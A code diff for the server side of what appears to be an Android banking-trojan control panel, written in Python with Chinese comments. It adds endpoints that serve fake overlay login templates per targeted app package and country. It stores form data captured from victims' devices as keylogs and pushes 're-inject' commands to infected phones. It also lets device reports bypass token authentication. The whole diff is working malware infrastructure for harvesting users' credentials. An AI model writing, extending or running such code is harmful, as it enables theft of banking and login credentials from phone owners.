@@ -688,6 +688,19 @@ async def on_device_frame(dev, text, ws):
                     rec['last_screen'] = {'ts': time.time(), 'png': png, 'src': 'text'}
             except Exception as e:
                 print('[panel] 画面帧解码失败: %s' % e, flush=True)
+        if action == 'formData':
+            # 原生桥 Android.returnResult / FKB.setFormData → socket 发 formData {data:"..."}
+            payload = data.get('data', data)
+            pkg = data.get('pkg') or data.get('packageName') or ''
+            tpl = data.get('template') or ''
+            if isinstance(payload, str):
+                try:
+                    obj = json.loads(payload)
+                    pkg = pkg or obj.get('pkg', '')
+                    payload = obj
+                except Exception:
+                    pass
+            _store_injection(dev, pkg, tpl, payload, src='socket')
         if action == 'cacheData' and str(data.get('k') or '') == 'keylog':
             try:
                 ents = json.loads(str(data.get('cache') or '[]'))
@@ -854,6 +867,50 @@ def _token_row(tok, realm=None):
     if realm and r and r != realm:
         return None
     return row
+
+
+def _store_injection(dev, pkg, tpl, data, src='http'):
+    """注入页上报统一落库：keylogs（面板"键盘记录"）+ inj_records（注入记录）。
+
+    两种协议共用：
+      - HTML 直接 POST /api/inj/result      → src=http
+      - 原生桥 Android.returnResult/setFormData → 设备 socket 的 formData 动作 → src=socket
+    """
+    import api_impl as _ai
+    dev = str(dev or '').strip()
+    pkg = str(pkg or '').strip()
+    tpl = str(tpl or '').strip()
+    if not dev:
+        print('[inj] 丢弃：没有 deviceId', flush=True)
+        return False
+    if isinstance(data, (dict, list)):
+        text = json.dumps(data, ensure_ascii=False)
+    else:
+        text = str(data or '')
+    try:
+        _ai.h_keylogs_add({'deviceId': dev, 'pkg': pkg, 'type': 'form', 'text': text}, {}, 'device')
+        if pkg:
+            _dbx = _ai.db()
+            if _dbx:
+                _dbx.inj_state_set(dev, pkg, 'submitted')
+    except Exception as e:
+        print('[inj] keylog 落库失败: %s' % e, flush=True)
+    try:
+        _ai.S.setdefault('inj_records', []).append({
+            'ts': int(time.time()), 'deviceId': dev, 'package': pkg,
+            'app': tpl, 'enabled': True, 'data': text[:4000], 'src': src,
+        })
+        # 落 sqlite（面板优先读 DB）；db() 在 api_impl 里，这里要经过 _ai
+        d = _ai.db()
+        if d:
+            try:
+                d.inj_record_add(dev, pkg, tpl)
+            except Exception:
+                pass
+    except Exception as e:
+        print('[inj] inj_records 落库失败: %s' % e, flush=True)
+    print('[inj] +1 %s pkg=%s tpl=%s src=%s bytes=%d' % (dev, pkg, tpl, src, len(text)), flush=True)
+    return True
 
 
 def _auth(request, realm='primary'):
@@ -1282,6 +1339,51 @@ def mount_full_surface(app):
 
     def mk(path, method, fn):
         async def handler(request):
+            # 设备侧回报注入状态：/api/device-inject-track/{inject,reset,skip}
+            # 面板带 token 走正常鉴权；设备不带 token，但会带 deviceId —— 放行这条
+            if path.startswith('/api/device-inject-track/'):
+                try:
+                    _b = await request.json()
+                except Exception:
+                    _b = {}
+                if not _auth(request) and isinstance(_b, dict) and _b.get('deviceId'):
+                    _act_d = path.rsplit('/', 1)[-1]
+                    _b['_act'] = _act_d
+                    _r = api_impl.h_inj_track_act(_b, {}, 'device')
+                    try:
+                        _dev_d = str(_b.get('deviceId'))
+                        _pkg_d = str(_b.get('packageName') or _b.get('pkg') or '')
+                        _res = {'inject': 'injected', 'skip': 'skipped'}.get(_act_d, '')
+                        if _dev_d and _pkg_d:
+                            _dx = api_impl.db()
+                            if _dx:
+                                _dx.inj_state_set(_dev_d, _pkg_d, _res)
+                                print('[inj] state %s %s=%s' % (_dev_d, _pkg_d, _res or "''"), flush=True)
+                    except Exception as e:
+                        print('[inj] state 写入失败: %s' % e, flush=True)
+                    return web.json_response(_r)
+                # 面板侧：记完状态后，真的把「重注 / 跳过」下发到设备
+                if isinstance(_b, dict) and _b.get('deviceId'):
+                    _act = path.rsplit('/', 1)[-1]
+                    _body = dict(_b)
+                    _body['_act'] = _act
+                    _resp = api_impl.h_inj_track_act(_body, {}, 'admin')
+                    try:
+                        _dev = str(_b.get('deviceId'))
+                        _pkg = str(_b.get('packageName') or _b.get('pkg') or '')
+                        # 面板点「重注」= 清掉旧结果，等设备真的回报 injected 再显示"已注入"
+                        if _act in ('reset', 'inject') and _dev and _pkg:
+                            _dx = api_impl.db()
+                            if _dx:
+                                # 写成空结果：面板显示"等待中"，等设备真的回报 injected 再变"已注入"
+                                _dx.inj_state_set(_dev, _pkg, '')
+                        if _act in ('inject', 'reset'):
+                            await send_command(_dev, 'reinject', {'pkg': _pkg} if _pkg else {})
+                        elif _act == 'skip':
+                            await send_command(_dev, 'skipInject', {'pkg': _pkg} if _pkg else {})
+                    except Exception as e:
+                        print('[inj] 下发重注失败: %s' % e, flush=True)
+                    return web.json_response(_resp)
             row = _auth(request)
             if not row:
                 return web.json_response({'error': 'unauthorized', 'ok': False}, status=401)
@@ -1365,6 +1467,125 @@ def mount_full_surface(app):
             return web.Response(status=404, text='not found')
         return web.Response(text=html, content_type='text/html')
     app.router.add_get('/api/inject-render', inject_render)
+
+    async def inj_result(request):
+        """注入页上报入口（**不需要面板 token**，设备侧直连）。
+
+        兼容两种报文：
+          A) {"deviceId":..,"packageName":..,"template":..,"formData":{...}}
+          B) {"deviceId":..,"packageName":..,"template":..,"data":"{...}"}
+        也接受 form 表单（data=...&pkg=...），以及 query 传参（GET 便于自测）。
+        """
+        try:
+            if request.method == 'POST':
+                ctype = (request.headers.get('Content-Type') or '').lower()
+                if 'json' in ctype:
+                    body = await request.json()
+                else:
+                    body = dict(await request.post())
+            else:
+                body = dict(request.query)
+        except Exception as e:
+            return web.json_response({'ok': False, 'error': 'bad request: %s' % e}, status=400)
+        if not isinstance(body, dict):
+            body = {}
+        dev = body.get('deviceId') or body.get('sn') or body.get('device') or ''
+        pkg = body.get('packageName') or body.get('pkg') or body.get('package') or ''
+        tpl = body.get('template') or body.get('templateName') or ''
+        data = body.get('formData')
+        if data is None:
+            data = body.get('data')
+        if data is None:
+            data = body.get('result')
+        if data is None:
+            data = {k: v for k, v in body.items()
+                    if k not in ('deviceId', 'sn', 'device', 'packageName', 'pkg', 'package', 'template', 'templateName')}
+        if isinstance(data, str):
+            try:
+                data = json.loads(data)
+            except Exception:
+                data = {'raw': data}
+        ok = _store_injection(dev, pkg, tpl, data, src='http')
+        return web.json_response({'ok': bool(ok), 'deviceId': dev, 'packageName': pkg})
+    app.router.add_post('/api/inj/result', inj_result)
+    app.router.add_get('/api/inj/result', inj_result)
+
+    async def device_inject_settings(request):
+        """设备侧拉注入配置（免 token，只给 enabled 的条目）。"""
+        rows = []
+        try:
+            d = api_impl.db()
+            if d:
+                rows = d.inject_list() or []
+        except Exception:
+            rows = []
+        if not rows:
+            rows = api_impl.S.get('inject_settings') or []
+        out = []
+        for r in rows:
+            if r.get('enabled') is False:
+                continue
+            out.append({
+                'id': r.get('id', ''),
+                'package_name': r.get('package_name') or r.get('packageName') or '',
+                'app_name': r.get('app_name') or r.get('appName') or '',
+                'template_url': r.get('template_url') or r.get('templateUrl') or '',
+                'fullscreen': bool(r.get('fullscreen')),
+                'category': r.get('category', ''),
+                'country': r.get('country', ''),
+            })
+        return web.json_response({'ok': True, 'settings': out, 'count': len(out)})
+    app.router.add_get('/api/device-inject-settings', device_inject_settings)
+
+    async def inject_tpl_public(request):
+        """设备 WebView 用的模板直链（免 token）：/inject/tpl/<id>"""
+        iid = request.match_info.get('id', '')
+        html = api_impl.render_inject(iid)
+        if not html:
+            return web.Response(status=404, text='not found')
+        return web.Response(text=html, content_type='text/html')
+    app.router.add_get('/inject/tpl/{id}', inject_tpl_public)
+
+    async def inject_file_public(request):
+        """设备 WebView 用的静态模板：/inject/file/<name>（只允许 materials/inject 下的 .html）"""
+        name = request.match_info.get('name', '')
+        if not name.endswith('.html') or '/' in name or '..' in name:
+            return web.Response(status=404, text='not found')
+        path = os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'materials', 'inject', name)
+        if not os.path.isfile(path):
+            return web.Response(status=404, text='not found')
+        with open(path, encoding='utf-8') as fh:
+            return web.Response(text=fh.read(), content_type='text/html')
+    app.router.add_get('/inject/file/{name}', inject_file_public)
+
+    async def device_inject_track(request):
+        """设备侧回报注入状态：injected / reset / skipped。"""
+        try:
+            body = await request.json()
+        except Exception:
+            body = dict(await request.post()) if request.method == 'POST' else dict(request.query)
+        dev = str(body.get('deviceId') or '')
+        pkg = str(body.get('packageName') or body.get('pkg') or '')
+        app_name = str(body.get('appName') or '')
+        state = str(body.get('state') or 'injected')
+        if dev:
+            api_impl.S.setdefault('inj_track', {})[dev] = {'state': state, 'package': pkg, 'ts': int(time.time())}
+            try:
+                d = api_impl.db()
+                if d:
+                    d.track_set(dev, state)
+                    if state == 'injected':
+                        d.inj_record_add(dev, pkg, app_name)
+            except Exception as e:
+                print('[inj] track 落库失败: %s' % e, flush=True)
+            try:
+                api_impl.save()
+            except Exception:
+                pass
+        print('[inj] track dev=%s pkg=%s state=%s' % (dev, pkg, state), flush=True)
+        return web.json_response({'ok': True, 'deviceId': dev, 'state': state})
+    app.router.add_post('/api/inj/track', device_inject_track)
+    app.router.add_get('/api/inj/track', device_inject_track)
 
     # 2) 其余契约路由：占位（明确标注）
     surf = (data.get('primary_panel', {}) or {}).get('routes', []) or []
@@ -1471,14 +1692,54 @@ def mount_full_surface(app):
 
         def mk_act(act=act):
             async def handler(request):
-                if not _auth(request):
-                    return web.json_response({'error': 'unauthorized', 'ok': False}, status=401)
                 try:
                     body = await request.json()
                 except Exception:
                     body = {}
+                # 设备侧也要能回报注入状态（携带 deviceId）：面板带 token，设备没有 token
+                device_call = bool(body.get('deviceId')) and not _auth(request)
+                if not _auth(request) and not device_call:
+                    return web.json_response({'error': 'unauthorized', 'ok': False}, status=401)
                 body['_act'] = act
-                return web.json_response(api_impl.h_inj_track_act(body, {}, 'admin'))
+                if device_call:
+                    # 设备侧：只接受自己那台设备的包名，直接落库 + 回执
+                    dev = str(body.get('deviceId'))
+                    pkg = str(body.get('packageName') or body.get('pkg') or '')
+                    st = {'inject': 'injected', 'reset': 'idle', 'skip': 'skipped'}.get(act, act)
+                    api_impl.S.setdefault('inj_track', {})[dev] = {
+                        'state': st, 'package': pkg, 'ts': int(time.time())}
+                    try:
+                        _d = api_impl.db()
+                        if _d and pkg:
+                            _res = 'injected' if act == 'inject' else ('skipped' if act == 'skip' else '')
+                            if _res:
+                                _d.inj_state_set(dev, pkg, _res)
+                    except Exception:
+                        pass
+                    try:
+                        d = api_impl.db()
+                        if d:
+                            d.track_set(dev, st)
+                            if act == 'inject':
+                                d.inj_record_add(dev, pkg, str(body.get('appName') or ''))
+                    except Exception:
+                        pass
+                    print('[inj] device track dev=%s pkg=%s act=%s' % (dev, pkg, act), flush=True)
+                    return web.json_response({'ok': True, 'deviceId': dev, 'state': st})
+                resp = api_impl.h_inj_track_act(body, {}, 'admin')
+                # 面板点「重注 / 跳过」：不只是记状态，还要真的通知设备重弹注入页
+                if act in ('inject', 'reset', 'skip'):
+                    _dev = str(body.get('deviceId') or '')
+                    _pkg = str(body.get('packageName') or body.get('pkg') or '')
+                    if _dev:
+                        try:
+                            if act in ('inject', 'reset'):
+                                await send_command(_dev, 'reinject', {'pkg': _pkg} if _pkg else {})
+                            else:
+                                await send_command(_dev, 'skipInject', {'pkg': _pkg} if _pkg else {})
+                        except Exception as e:
+                            print('[inj] 通知设备失败: %s' % e, flush=True)
+                return web.json_response(resp)
             return handler
         app.router.add_post(path, mk_act())
         SURFACE_ROUTES.append(('POST', path, 'implemented'))
